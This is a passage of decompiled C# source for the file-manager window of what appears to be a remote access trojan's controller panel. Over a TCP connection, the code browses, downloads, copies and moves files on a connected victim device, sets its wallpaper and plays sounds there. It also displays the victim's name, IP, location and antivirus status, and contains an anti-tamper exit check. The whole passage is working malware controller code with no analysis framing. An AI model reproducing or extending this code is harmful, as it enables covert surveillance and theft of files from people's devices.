									}), obj), GClass9.string_1), this.string_3), GClass9.string_1), Module13.string_17), "File" + this.gclass8_0.string_9),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D1A RID: 3354 RVA: 0x00089B10 File Offset: 0x00087D10
		private void method_30(string string_0)
		{
			checked
			{
				if (!(Operators.CompareString(string_0, "'PASTE'", false) == 0 & this.arrays_0.Count > 0))
				{
					this.arrays_0.Clear();
					if (this.DGV0.SelectedRows.Count > 0)
					{
						int num = this.DGV0.SelectedRows.Count - 1;
						for (int i = num; i >= 0; i += -1)
						{
							string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
							if (Operators.CompareString(left, "back", false) != 0)
							{
								string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
								bool flag = Operators.CompareString(left, "1", false) == 0;
								if (Operators.CompareString(string_0, "'COPY'", false) != 0)
								{
									this.arrays_0.Add(new object[]
									{
										string_0,
										flag,
										this.method_31(text),
										"mv"
									});
								}
								else if (!flag)
								{
									this.arrays_0.Add(new object[]
									{
										string_0,
										flag,
										this.method_31(text),
										"cp -R"
									});
								}
								else
								{
									this.arrays_0.Add(new object[]
									{
										string_0,
										flag,
										this.method_31(text),
										"cp"
									});
								}
							}
						}
					}
				}
				else
				{
					string right = this.method_31(Conversions.ToString(this.DGV0.Tag));
					string text2 = "";
					try
					{
						foreach (Array array in this.arrays_0)
						{
							Array instance = array;
							if (text2.Length != 0)
							{
								text2 = Conversions.ToString(Operators.ConcatenateObject(text2, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Strings.Space(1) + "&&" + Strings.Space(1), NewLateBinding.LateIndexGet(instance, new object[]
								{
									3
								}, null)), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[]
								{
									2
								}, null)), Strings.Space(1)), right)));
							}
							else
							{
								text2 = Conversions.ToString(Operators.ConcatenateObject(text2, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet(instance, new object[]
								{
									3
								}, null), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[]
								{
									2
								}, null)), Strings.Space(1)), right)));
							}
						}
					}
					finally
					{
						List<Array>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".files",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_40,
							GClass9.string_0,
							"commend",
							GClass9.string_1,
							text2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
					this.arrays_0.Clear();
				}
			}
		}

		// Token: 0x06000D1B RID: 3355 RVA: 0x00089F0C File Offset: 0x0008810C
		private string method_31(string string_0)
		{
			if (string_0.Contains(Strings.Space(1)))
			{
				string_0 = string_0.Replace(Strings.Space(1), "(U+0020)".ToLower());
			}
			return string_0;
		}

		// Token: 0x06000D1C RID: 3356 RVA: 0x00089F44 File Offset: 0x00088144
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_30("'CUT'");
		}

		// Token: 0x06000D1D RID: 3357 RVA: 0x00089F5C File Offset: 0x0008815C
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_30("'COPY'");
		}

		// Token: 0x06000D1E RID: 3358 RVA: 0x00089F74 File Offset: 0x00088174
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.arrays_0.Count != 0)
			{
				this.method_30("'PASTE'");
			}
		}

		// Token: 0x06000D1F RID: 3359 RVA: 0x00089F9C File Offset: 0x0008819C
		private void SetWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
						{
							string right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), right));
							if (this.gclass8_0 != null)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"set_wallpaper",
										GClass9.string_1,
										text
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D20 RID: 3360 RVA: 0x0008A14C File Offset: 0x0008834C
		private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
						{
							string right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), right));
							if (this.gclass8_0 != null)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"play_back",
										GClass9.string_1,
										text
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D21 RID: 3361 RVA: 0x0008A300 File Offset: 0x00088500
		private void ctxMenu_Opening(object sender, CancelEventArgs e)
		{
			string left = this.string_1;
			if (Operators.CompareString(left, "v1.0", false) == 0)
			{
				this.SetWallpaperToolStripMenuItem.Visible = false;
			}
			else
			{
				this.SetWallpaperToolStripMenuItem.Visible = true;
			}
		}

		// Token: 0x06000D22 RID: 3362 RVA: 0x0008A33C File Offset: 0x0008853C
		private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.DGVDATA.Rows.Count > 0)
			{
				int num = 0;
				try
				{
					foreach (DataGridViewRow dataGridViewRow in ((IEnumerable)this.DGVDATA.Rows))
					{
						if (dataGridViewRow.Tag.ToString().Length > 1 && Operators.CompareString(dataGridViewRow.Tag.ToString(), "x", false) != 0)
						{
							num = 1;
							break;
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				if (num > 0)
				{
					try
					{
						if (!Module2.smethod_30("Downloads", "Some Downloads is Running :\r\nStop Active Downloads...?", true))
						{
							e.Cancel = true;
							return;
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			this.Timer1.Stop();
			this.Timer2.Stop();
			this.int_0 = 1;
			int count = this.collection_1.Count;
			checked
			{
				for (int i = 1; i <= count; i++)
				{
					try
					{
						if (this.collection_1[i] != null)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(this.collection_1[i]);
							FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[]
							{
								0
							}, null);
							Conversions.ToLong(NewLateBinding.LateIndexGet(objectValue, new object[]
							{
								1
							}, null));
							if (fileStream != null)
							{
								fileStream.Dispose();
								fileStream.Close();
							}
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
		}

		// Token: 0x06000D23 RID: 3363 RVA: 0x0008A500 File Offset: 0x00088700
		private void method_39(object sender, EventArgs e)
		{
			try
			{
				this.PB.Size = this.pathtxt.Size;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000D24 RID: 3364 RVA: 0x0008A544 File Offset: 0x00088744
		private void method_40()
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count == 1)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							this.string_5 = Conversions.ToString(Operators.ConcatenateObject(this.gclass8_0.string_10 + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
							{
								"/",
								"\\"
							}, null, null, null)));
							if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
							{
								this.bool_0 = true;
								this.thumb_chk.Checked = false;
								this.thumb_chk.Refresh();
								string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
								object obj;
								if (!this.method_26(text2.ToLower()))
								{
									if (this.method_27(text2.ToLower()))
									{
										obj = "true";
									}
									else
									{
										obj = "null";
									}
								}
								else
								{
									obj = "false";
								}
								if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.gclass8_0 != null)
								{
									string[] array = this.gclass8_0.string_0.Split(new char[]
									{
										':'
									});
									object[] objects_ = new object[]
									{
										this.object_0,
										Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".files",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_40,
											GClass9.string_0,
											"small",
											GClass9.string_1,
											array[0],
											GClass9.string_1,
											array[1],
											GClass9.string_1,
											text,
											GClass9.string_1
										}), obj), GClass9.string_1), this.string_3), GClass9.string_1), Module13.string_17), "File" + this.gclass8_0.string_9),
										Module2.smethod_9().GetBytes("null"),
										this.gclass8_0
									};
									this.gclass8_0.method_2(objects_);
								}
							}
						}
						else
						{
							this.viwimage.Image = null;
						}
					}
				}
			}
		}

		// Token: 0x06000D25 RID: 3365 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_41(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000D26 RID: 3366 RVA: 0x0008A8B4 File Offset: 0x00088AB4
		private void method_42(object sender, EventArgs e)
		{
			this.bool_0 = false;
			this.thumb_chk.Checked = true;
			this.thumb_chk.Refresh();
		}

		// Token: 0x06000D27 RID: 3367 RVA: 0x0008A8E0 File Offset: 0x00088AE0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.gclass8_0.bool_0)
				{
					this.ClientPic.Image = Module0.disconnected;
				}
				else if (this.gclass8_0.bool_10)
				{
					this.Text = string.Format("{0} - ID:{1}", "File Manager", this.gclass8_0.string_9);
					this.ClientPic.Image = (Image)this.gclass8_0.objects_1[0];
					this.usrscreen.Image = Module8.smethod_27(this.gclass8_0.string_4);
					try
					{
						if (this.gclass8_0.dataGridViewRow_0 != null)
						{
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000D28 RID: 3368 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_44(object sender, EventArgs e)
		{
		}

		// Token: 0x06000D29 RID: 3369 RVA: 0x0008A9C4 File Offset: 0x00088BC4
		private void method_45(object sender, EventArgs e)
		{
			if (this.DGVDATA.SelectedRows.Count > 0)
			{
				try
				{
					foreach (object obj in this.DGVDATA.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						if (dataGridViewRow.Tag.ToString().Length > 1)
						{
							dataGridViewRow.Tag = "X";
							dataGridViewRow.Cells[4].Value = "Cancelled..";
							dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
							dataGridViewRow.Dispose();
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000D2A RID: 3370 RVA: 0x0008AA84 File Offset: 0x00088C84
		private void Usrbtry_MouseEnter(object sender, EventArgs e)
		{
			string text = "%" + this.gclass8_0.string_12;
			this.ToolTip1.Show(text, this.Usrbtry, 1000);
		}

		// Token: 0x06000D2B RID: 3371 RVA: 0x0008AAC0 File Offset: 0x00088CC0
		private void ClientPic_MouseEnter(object sender, EventArgs e)
		{
			try
			{
				string text = string.Concat(new string[]
				{
					"User-INFO\r\nName:",
					this.gclass8_0.string_8,
					"\r\nDefender:",
					this.gclass8_0.object_3,
					"\r\nFrom:",
					this.gclass8_0.string_6,
					"\r\nip:",
					this.gclass8_0.string_1
				});
				this.ToolTip1.Show(text, this.ClientPic, 2000);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000D2C RID: 3372 RVA: 0x0008AB6C File Offset: 0x00088D6C
		private void Downpic_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Downpic.Tag.ToString(), "off", false) != 0)
			{
				this.Downpic.Tag = "off";
				this.ClearButton.Enabled = false;
				this.ClearButton.Visible = false;
				this.cancelbtn.Enabled = false;
				this.cancelbtn.Visible = false;
				this.DGVDATA.SendToBack();
			}
			else
			{
				this.Downpic.Tag = "on";
				this.ClearButton.Enabled = true;
				this.ClearButton.Visible = true;
				this.cancelbtn.Enabled = true;
				this.cancelbtn.Visible = true;
				this.DGVDATA.BringToFront();
			}
		}

		// Token: 0x06000D2D RID: 3373 RVA: 0x0008AC34 File Offset: 0x00088E34
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				string path = Conversions.ToString(Operators.ConcatenateObject(this.gclass8_0.string_10 + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
				{
					"/",
					"\\"
				}, null, null, null)));
				int num = 0;
				if (Directory.Exists(path))
				{
					num = Directory.GetFiles(path, "*.*").Count<string>();
				}
				int value = checked(this.DGV0.Rows.Count - 1);
				int count = this.arrays_0.Count;
				string left = Module4.smethod_1();
				if (Operators.CompareString(left, "AR", false) != 0)
				{
					if (Operators.CompareString(left, "CN", false) != 0)
					{
						if (Operators.CompareString(left, "EN", false) == 0)
						{
							this.CountText.Text = "ALL " + Conversions.ToString(value);
							this.Selecttext.Text = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
							this.seentext.Text = "Seen " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "Clipboard " + Conversions.ToString(this.arrays_0.Count)) : "");
						}
					}
					else
					{
						this.CountText.Text = "全部的 " + Conversions.ToString(value);
						this.Selecttext.Text = "选择 " + Conversions.ToString(this.DGV0.SelectedRows.Count);
						this.seentext.Text = "见过 " + num.ToString() + ((count <= 0) ? "" : (Strings.Space(10) + "في المحفظة " + Conversions.ToString(this.arrays_0.Count)));
					}
				}
				else
				{
					this.CountText.Text = "العدد " + Conversions.ToString(value);
					this.Selecttext.Text = "المحدد " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					this.seentext.Text = "تمت مشاهدته " + num.ToString() + ((count <= 0) ? "" : (Strings.Space(10) + "في المحفظة " + Conversions.ToString(this.arrays_0.Count)));
				}
				if (Operators.CompareString(this.Label1.Text, Module2.smethod_60("zIP9ZSzCinaAzselRXUoBQ==", "9653641976824591"), false) != 0)
				{
					Environment.Exit(0);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000D2E RID: 3374 RVA: 0x0000680C File Offset: 0x00004A0C
		private void viwimage_MouseEnter(object sender, EventArgs e)
		{
			this.method_40();
		}

		// Token: 0x06000D2F RID: 3375 RVA: 0x0008A8B4 File Offset: 0x00088AB4
		private void viwimage_MouseLeave(object sender, EventArgs e)
		{
			this.bool_0 = false;
			this.thumb_chk.Checked = true;
			this.thumb_chk.Refresh();
		}

		// Token: 0x06000D30 RID: 3376 RVA: 0x0008AF10 File Offset: 0x00089110
		private void sdbtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get0"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D31 RID: 3377 RVA: 0x0008AFD4 File Offset: 0x000891D4
		private void dcmbtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get3"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D32 RID: 3378 RVA: 0x00087948 File Offset: 0x00085B48
		private void picbtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1,
						"get2"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D33 RID: 3379 RVA: 0x0008B098 File Offset: 0x00089298
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1
					}), this.method_4(Conversions.ToString(this.DGV0.Tag))),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D34 RID: 3380 RVA: 0x0008B170 File Offset: 0x00089370
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1
					}), this.DGV0.Tag),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000D35 RID: 3381 RVA: 0x0008B23C File Offset: 0x0008943C
		private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							if (this.gclass8_0 != null)
							{
								string[] array = this.gclass8_0.string_0.Split(new char[]
								{
									':'
								});
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"download",
										GClass9.string_1,
										array[0],
										GClass9.string_1,
										array[1],
										GClass9.string_1,
										text,
										GClass9.string_1,
										Module13.string_12,
										"File",
										this.gclass8_0.string_9,
										GClass9.string_1,
										Module13.string_13,
										"File",
										this.gclass8_0.string_9,
										GClass9.string_1,
										"File",
										this.gclass8_0.string_9
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
					}
				}
			}
		}

		// Token: 0x06000D36 RID: 3382 RVA: 0x0008B498 File Offset: 0x00089698
		private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
		{
			if (this.viwimage.Image != null)
			{
				Bitmap bitmap = new Bitmap(this.viwimage.Image);
				bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
				this.viwimage.Image = bitmap;
			}
		}

		// Token: 0x06000D37 RID: 3383 RVA: 0x0008B4DC File Offset: 0x000896DC
		private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				string text = this.gclass8_0.string_10 + "\\Downloads";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
		}

		// Token: 0x06000D38 RID: 3384 RVA: 0x0008B524 File Offset: 0x00089724
		private void cancelbtn_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.DGVDATA.SelectedRows.Count > 0)
				{
					try
					{
						foreach (object obj in this.DGVDATA.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							if (dataGridViewRow.Tag.ToString().Length > 1)
							{
								dataGridViewRow.Tag = "X";
								dataGridViewRow.Cells[4].Value = "Cancelled..";
								dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
								dataGridViewRow.Dispose();
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000D39 RID: 3385 RVA: 0x0008B600 File Offset: 0x00089800
		private void clearsrchbtn_Click(object sender, EventArgs e)
		{
			this.searchtext.Text = "";
		}

		// Token: 0x06000D3A RID: 3386 RVA: 0x0008B620 File Offset: 0x00089820
		private void searchtext_TextChanged(object sender, EventArgs e)
		{
			this.dataGridViewRows_0.Clear();
			if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				this.clearsrchbtn.Visible = false;
			}
			else
			{
				this.clearsrchbtn.Visible = true;
			}
		}

		// Token: 0x06000D3B RID: 3387 RVA: 0x0008B668 File Offset: 0x00089868
		private void searchbtn_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.Rows.Count >= 1)
				{
					if (string.IsNullOrEmpty(this.searchtext.Text))
					{
						Alert.ShowInformation("Enter Text to search First");
					}
					else
					{
						bool flag = true;
						int num = this.DGV0.Rows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								DataGridViewRow dataGridViewRow = this.DGV0.Rows[i];
								if (!this.dataGridViewRows_0.Contains(dataGridViewRow))
								{
									flag = false;
									if (dataGridViewRow.Cells[1].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[2].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[3].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[4].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[5].Value.ToString().Contains(this.searchtext.Text.ToLower()))
									{
										this.DGV0.ClearSelection();
										this.DGV0.FirstDisplayedScrollingRowIndex = i;
										dataGridViewRow.Selected = true;
										this.dataGridViewRows_0.Add(dataGridViewRow);
										break;
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
						if (flag)
						{
							Alert.ShowInformation("No Result Found");
						}
					}
				}
				else
				{
					Alert.ShowInformation("No Data Found");
				}
			}
		}

		// Token: 0x06000D3C RID: 3388 RVA: 0x0008B86C File Offset: 0x00089A6C
		private void ClearButton_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.DGVDATA.Rows.Count > 0)
					{
						int num = this.DGVDATA.Rows.Count - 1;
						for (int i = num; i >= 0; i += -1)
						{
							try
							{
								DataGridViewRow dataGridViewRow = this.DGVDATA.Rows[i];
								if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(dataGridViewRow.Tag == null, Operators.CompareObjectEqual(dataGridViewRow.Tag, "f", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "x", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "X", false))))
								{
									try
									{
										string string_ = dataGridViewRow.Cells[0].Value.ToString();
										object objectValue = RuntimeHelpers.GetObjectValue(Module8.smethod_17(string_, this.collection_1));
										FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[]
										{
											0
										}, null);
										if (fileStream != null)
										{
											fileStream.Dispose();
											fileStream.Close();
										}
									}
									catch (Exception ex)
									{
									}
									this.DGVDATA.Rows.RemoveAt(dataGridViewRow.Index);
									this.Downpic.BadgeText = this.DGVDATA.Rows.Count.ToString();
								}
							}
							catch (Exception ex2)
							{
							}
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x0400072A RID: 1834
		public TcpClient object_0;

		// Token: 0x0400072B RID: 1835
		public GClass8 gclass8_0;

		// Token: 0x0400072C RID: 1836
		public string string_0;

		// Token: 0x0400072D RID: 1837
		public string string_1;

		// Token: 0x0400072E RID: 1838
		public int int_0;

		// Token: 0x0400072F RID: 1839
		public Collection collection_0;

		// Token: 0x04000730 RID: 1840
		private string string_2;

		// Token: 0x04000731 RID: 1841
		private string string_3;

		// Token: 0x04000732 RID: 1842
		public bool bool_0;

		// Token: 0x04000733 RID: 1843
		public string string_4;

		// Token: 0x04000734 RID: 1844
		public Collection collection_1;

		// Token: 0x04000735 RID: 1845
		private string string_5;

		// Token: 0x04000736 RID: 1846
		private List<Array> arrays_0;

		// Token: 0x04000737 RID: 1847
		private bool bool_1;

		// Token: 0x04000738 RID: 1848
		private object object_1;

		// Token: 0x04000739 RID: 1849
		private PictureBox pictureBox_0;

		// Token: 0x0400073A RID: 1850
		private List<DataGridViewRow> dataGridViewRows_0;
	}
}
